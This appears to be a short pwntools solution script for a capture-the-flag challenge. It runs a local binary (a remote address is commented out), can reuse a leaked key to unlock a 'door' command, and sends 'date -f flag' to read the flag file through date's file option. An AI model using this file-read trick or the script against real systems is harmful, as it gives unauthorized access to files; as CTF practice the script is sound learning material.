from pwn import *

# r = remote("47.96.229.249", 35640)
r = process("./main_static")

r.recvline()

def write_cat():
    r.sendline(b"showKey")
    r.recvuntil(b"Key:  ")
    key = r.recvline().decode()[:-2]
    r.sendline(f"openthedoor -k{key}".encode())

# write_cat()
r.sendline(b'date -f flag')
# recv = r.recvline()
# print("recv: {recv}")

r.interactive()